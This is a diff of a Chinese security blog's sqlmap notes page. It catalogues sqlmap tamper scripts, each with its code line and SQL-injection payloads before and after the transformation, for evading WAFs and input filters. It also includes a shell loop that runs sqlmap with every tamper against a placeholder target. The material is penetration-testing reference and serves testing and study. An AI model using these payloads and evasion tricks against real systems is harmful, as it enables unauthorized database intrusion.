+<pre><code>1 AND A &gt; Bto1 AND A NOT BETWEEN 0 AND B
+
+1 AND A = Bto1 AND A BETWEEN B AND B
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>bluecoat.py: </p>
+<p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p>
+<pre><code>union select * from users where id = 1tounion%09select * from%09users where id like 1
+</code></pre><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p>
+<p>chardoubleencode.py: </p>
+<p>用 url 编码两次你的 payload </p>
+<pre><code>select * from usersto%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>charencode.py: </p>
+<p>用 url 编码一次你的 payload</p>
+<pre><code>select * from usersto%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>charunicodeencode.py： </p>
+<p>用 unicode 编码 payload ，只编码非编码字符</p>
+<pre><code>select * from usersto\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073
+</code></pre><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p>
+<p>commalesslimit.py： </p>
+<p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p>
+<pre><code>limit 2,1tolimit 1 offset 2
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>commalessmid.py： </p>
+<p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p>
+<pre><code>mid(version(), 1, 1)tomid(version() from 1 for 1)
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>commentbeforeparentheses.py： </p>
+<pre><code>retVal = re.sub(r&quot;\b(\w+)(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)
+</code></pre><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p>
+<pre><code>union select group_concat(table_name)tounion select group_concat/**/(table_name)
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>concat2concatws.py： </p>
+<pre><code>payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)
+</code></pre><p>用于过滤了 concat 函数的情况</p>
+<pre><code>concat(1,2)toconcat_ws(mid(char(0), 0, 0), 1, 2)
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>equaltolike.py： </p>
+<pre><code>retVal = re.sub(r&quot;\s=\s&quot;, &quot; LIKE &quot;, retVal)
+</code></pre><p>将等号用 like 代替，用于过滤了等号的情况</p>
+<pre><code>select * from users where id=1toselect * from users where id like 1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>escapequotes.py： </p>
+<pre><code>return payload.replace(&quot;&apos;&quot;, &quot;\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\&quot;&apos;)
+</code></pre><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p>
+<pre><code>1&apos; and 1=1--+to1\\&apos; and 1=1--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>greatest.py： </p>
+<p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p>
+<pre><code>1 and a&gt;bto1 and greatest(a,b+1)=a
+</code></pre><p>ALL</p>
+<p>halfversionedmorekeywords.py： </p>
+<p>在关键字前添加注释，用于过滤了关键字的情况</p>
+<pre><code>union select 1,2to/*!0union/*!0select 1,2
+</code></pre><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p>
+<p>htmlencode.py： </p>
+<pre><code>return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload
+</code></pre><p>从名字就知道是将 payload 进行 html 编码</p>
+<pre><code>1&apos; and 1=1--+to&amp;#49;&amp;#39;&amp;#32;&amp;#97;&amp;#110;&amp;#100;&amp;#32;&amp;#49;&amp;#61;&amp;#49;&amp;#45;&amp;#45;&amp;#43;
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>ifnull2ifisnull.py： </p>
+<p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p>
+<pre><code>ifnull(1, 2)toif(isnull(1), 2, 1)
+</code></pre><p><strong>适用数据库：</strong>MySql</p>
+<p>informationschemacomment.py： </p>
+<pre><code>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)
+</code></pre><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p>
+<pre><code>select table_name from information_schema.tablestoselect table_name from information_schema/**/.tables
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>lowercase.py： </p>
+<p>将 payload 里的大写转为小写</p>
+<pre><code>UNION SELECTtounion select
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>modsecurityversioned.py： </p>
+<p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p>
+<pre><code>1 and 2&gt;1--+to1 /*!30874and 2&gt;1*/--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>modsecurityzeroversioned.py： </p>
+<p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p>
+<pre><code>1 and 2&gt;1--+to1 /*!00000and 2&gt;1*/--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>multiplespaces.py： </p>
+<p>在关键字周围添加多个空格</p>
+<pre><code>union select 1,2--+tounion         select       1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>nonrecursivereplacement.py： </p>
+<p>关键字双写，可用于关键字过滤</p>
+<pre><code>union select 1,2--+touniounionn selecselectt 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>overlongutf8.py： </p>
+<p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p>
+<pre><code>select field from table where 2&gt;1toselect%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>percentage.py： </p>
+<p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<pre><code>select * from usersto%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s
+</code></pre><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p>
+<p>plus2concat.py： </p>
+<p>用 concat 函数来替代加号，用于加号被过滤的情况</p>
+<pre><code>select char(13)+char(114)+char(115) from usertoselect concat(char(113),char(114),char(115)) from user
+</code></pre><p><strong>适用数据库：</strong>SQL Server 2012+</p>
+<p>plus2fnconcat.py： </p>
+<p>用 fn concat 来替代加号，和上面类似</p>
+<pre><code>select char(13)+char(114)+char(115) from usertoselect {fn concat({ fn concat(char(113),char(114))},char(115))} from user
+</code></pre><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p>
+<p>randomcase.py： </p>
+<p>将 payload 随机大小写，可用于大小写绕过的情况</p>
+<pre><code>union select 1,2--+toUniOn SElect 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>randomcomments.py： </p>
+<p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p>
+<pre><code>union select 1,2--+toun/**/ion sele/**/ct 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>securesphere.py： </p>
+<pre><code>return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload
+</code></pre><p>在 payload 后面加入字符串，可以自定义</p>
+<pre><code>1&apos; and 1=1to1&apos; and 1=1 &apos;0having&apos;=&apos;0having&apos;
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>sp_password.py： </p>
+<pre><code>retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)
+</code></pre><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p>
+<pre><code>1’  and 1=1--+to1 and 1=1-- sp_password
+</code></pre><p><strong>适用数据库：</strong>MSSQL</p>
+<p>space2comment.py： </p>
+<p>用 /**/ 替代空格，用于空格的绕过</p>
+<pre><code>union select 1,2--+tounion/**/select/**/1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2dash.py： </p>
+<p>用注释符–和一个随机字符串加一个换行符替换控制符</p>
+<p>?union select 1,2–+tounion–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
+<p><strong>适用数据库：</strong>MSSQL、 SQLite</p>
+<p>space2hash.py： </p>
+<p>和上面类似，不过这儿是用#注释符</p>
+<pre><code>union select 1,2--+tounion%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>space2morecomment.py： </p>
+<p>将空格用 /<strong>_</strong>/ 替代</p>
+<pre><code>union select 1,2--+tounion/**_**/select/**_**/1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2morehash.py： </p>
+<p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p>
+<pre><code>space2hash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2--+
+
+space2morehash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<p>space2mssqlblank.py： </p>
+<pre><code>blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)
+</code></pre><p>用这些随机空白符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+tounion%01select%021,2--+
+</code></pre><p><strong>适用数据库：</strong>SQL Server</p>
+<p>space2mssqlhash.py： </p>
+<p>用 # 加一个换行符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+ tounion%23%0Aselect%23%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MSSQL、MySQL</p>
+<p>space2mysqlblank.py： </p>
+<pre><code>blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)
+</code></pre><p>用这些随机空白符替换payload中的空格</p>
+<pre><code>union select 1,2--+tounion%09select%0D1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>space2mysqldash.py： </p>
+<p>用 – 加一个换行符替换空格</p>
+<pre><code>union select 1,2--+tounion--%0Aselect--%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL、MSSQL</p>
+<p>space2plus.py： </p>
+<p>用 + 替换空格</p>
+<pre><code>union select 1,2--+tounion+select+1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2randomblank.py： </p>
+<pre><code>blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)
+</code></pre><p>用这些随机空白符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+tounion%09select%0C1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>symboliclogical.py： </p>
+<pre><code>retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))
+</code></pre><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p>
+<pre><code>1 and 1=1to1 %26%26 1=1
+
+1 or 1=1to1 %7c%7c 1=1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>unionalltounion.py： </p>
+<pre><code>return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload
+</code></pre><p>用 union select 替换union all select</p>
+<pre><code>union all select 1,2--+tounion select 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>unmagicquotes.py： </p>
+<p>用宽字符绕过 GPC addslashes</p>
+<pre><code>1‘ and 1=1to1%df%27 and 1=1--
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>uppercase.py： </p>
+<p>将 payload 大写</p>
+<pre><code>union selecttoUNION SELECT
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>varnish.py： </p>
+<pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload
+</code></pre><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p>
+<p>还可以自定义：</p>
+<pre><code>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>versionedkeywords.py </p>
+<p>对不是函数的关键字进行注释</p>
+<pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
+</code></pre><p>to</p>
+<pre><code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>versionedmorekeywords.py： </p>
+<p>注释每个关键字</p>
+<pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
+</code></pre><p>to</p>
+<pre><code>1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))#
+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<p>xforwardedfor.py： </p>
+<pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload
+</code></pre><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p>
+<p><strong>适用数据库：</strong>ALL</p>
 <p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p>
 <p><strong>说明下 :</strong></p>
 <p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p>
@@ -420,7 +908,7 @@ ga('send', 'pageview');
 
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.club/sqlmap/" data-id="cjp9dj6sp006mz0t664989fjs" class="article-share-link" data-share="baidu" data-title="sqlmap笔记">分享到</a>
+        <a data-url="http://www.pa55w0rd.club/sqlmap/" data-id="cjp9j4ddz00724pt6gk97k8cr" class="article-share-link" data-share="baidu" data-title="sqlmap笔记">分享到</a>
       
 
       
@@ -493,19 +981,19 @@ ga('send', 'pageview');
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/encrypt-test/">encrypt_test</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/yyoa/">用友致远A6 OA存在sql注入并拿shell</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
             <a id="recentpost_item" href="/linux-backdoor-killer/">Linux后门入侵检测工具使用</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
             <a id="recentpost_item" href="/winspect/">WINSpect-基于Powershell的Windows安全审计工具</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/captcha/">如何设计相对安全的图形验证码？ （转发）</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/sqlmap/">sqlmap笔记</a>
           </li>
         
       </ul>
@@ -518,7 +1006,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-tasks"></i>分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/企业安全/">企业安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/企业安全/">企业安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -534,7 +1022,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-cloud"></i>标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.67px;">checklist</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/windows-审计工具/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/业务安全/" style="font-size: 10px;">业务安全</a> <a href="/tags/代码扫描/" style="font-size: 10px;">代码扫描</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/内网安全/" style="font-size: 10px;">内网安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/前端加密/" style="font-size: 10px;">前端加密</a> <a href="/tags/名词解释/" style="font-size: 10px;">名词解释</a> <a href="/tags/基础知识/" style="font-size: 15px;">基础知识</a> <a href="/tags/基线加固/" style="font-size: 10px;">基线加固</a> <a href="/tags/备忘录/" style="font-size: 10px;">备忘录</a> <a href="/tags/安全建设/" style="font-size: 18.33px;">安全建设</a> <a href="/tags/安全架构/" style="font-size: 10px;">安全架构</a> <a href="/tags/安全测试/" style="font-size: 10px;">安全测试</a> <a href="/tags/安全规划/" style="font-size: 10px;">安全规划</a> <a href="/tags/安全规范/" style="font-size: 13.33px;">安全规范</a> <a href="/tags/安全设计/" style="font-size: 16.67px;">安全设计</a> <a href="/tags/安全设计评审/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/安全评估/" style="font-size: 10px;">安全评估</a> <a href="/tags/安全运维/" style="font-size: 10px;">安全运维</a> <a href="/tags/安装使用/" style="font-size: 11.67px;">安装使用</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/平台建设/" style="font-size: 11.67px;">平台建设</a> <a href="/tags/应急响应/" style="font-size: 11.67px;">应急响应</a> <a href="/tags/开发安全/" style="font-size: 15px;">开发安全</a> <a href="/tags/开源工具/" style="font-size: 10px;">开源工具</a> <a href="/tags/技巧/" style="font-size: 11.67px;">技巧</a> <a href="/tags/指南/" style="font-size: 10px;">指南</a> <a href="/tags/操作记录/" style="font-size: 10px;">操作记录</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞利用/" style="font-size: 16.67px;">漏洞利用</a> <a href="/tags/移动安全/" style="font-size: 10px;">移动安全</a> <a href="/tags/等级保护/" style="font-size: 10px;">等级保护</a> <a href="/tags/红蓝对抗/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/解决方法/" style="font-size: 20px;">解决方法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a> <a href="/tags/资产扫描/" style="font-size: 10px;">资产扫描</a> <a href="/tags/迁移/" style="font-size: 10px;">迁移</a> <a href="/tags/速查表/" style="font-size: 10px;">速查表</a> <a href="/tags/非web型xss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/验证码安全/" style="font-size: 10px;">验证码安全</a>
+      <a href="/tags/Android/" style="font-size: 11.67px;">Android</a> <a href="/tags/Android-安全测试-工具使用/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.67px;">checklist</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/web安全/" style="font-size: 11.67px;">web安全</a> <a href="/tags/windows-审计工具/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/业务安全/" style="font-size: 10px;">业务安全</a> <a href="/tags/代码扫描/" style="font-size: 10px;">代码扫描</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/内网安全/" style="font-size: 10px;">内网安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/前端加密/" style="font-size: 10px;">前端加密</a> <a href="/tags/名词解释/" style="font-size: 10px;">名词解释</a> <a href="/tags/基础知识/" style="font-size: 15px;">基础知识</a> <a href="/tags/基线加固/" style="font-size: 10px;">基线加固</a> <a href="/tags/备忘录/" style="font-size: 10px;">备忘录</a> <a href="/tags/安全建设/" style="font-size: 18.33px;">安全建设</a> <a href="/tags/安全架构/" style="font-size: 10px;">安全架构</a> <a href="/tags/安全规划/" style="font-size: 10px;">安全规划</a> <a href="/tags/安全规范/" style="font-size: 13.33px;">安全规范</a> <a href="/tags/安全设计/" style="font-size: 16.67px;">安全设计</a> <a href="/tags/安全设计评审/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/安全评估/" style="font-size: 10px;">安全评估</a> <a href="/tags/安全运维/" style="font-size: 10px;">安全运维</a> <a href="/tags/安装使用/" style="font-size: 11.67px;">安装使用</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/平台建设/" style="font-size: 11.67px;">平台建设</a> <a href="/tags/应急响应/" style="font-size: 11.67px;">应急响应</a> <a href="/tags/开发安全/" style="font-size: 15px;">开发安全</a> <a href="/tags/开源工具/" style="font-size: 10px;">开源工具</a> <a href="/tags/技巧/" style="font-size: 11.67px;">技巧</a> <a href="/tags/指南/" style="font-size: 10px;">指南</a> <a href="/tags/操作记录/" style="font-size: 10px;">操作记录</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞利用/" style="font-size: 16.67px;">漏洞利用</a> <a href="/tags/移动安全/" style="font-size: 10px;">移动安全</a> <a href="/tags/等级保护/" style="font-size: 10px;">等级保护</a> <a href="/tags/红蓝对抗/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/解决方法/" style="font-size: 20px;">解决方法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a> <a href="/tags/资产扫描/" style="font-size: 10px;">资产扫描</a> <a href="/tags/迁移/" style="font-size: 10px;">迁移</a> <a href="/tags/速查表/" style="font-size: 10px;">速查表</a> <a href="/tags/非web型xss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/验证码安全/" style="font-size: 10px;">验证码安全</a>
     </div>
   </div>
 
@@ -544,8 +1032,8 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-archive"></i>归档</h3>
     <div class="widget">
-      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">12</span></li></ul> -->
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">2022年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">12</span></li></ul>
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">12</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">2022年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">12</span></li></ul>
     </div>
   </div>
 
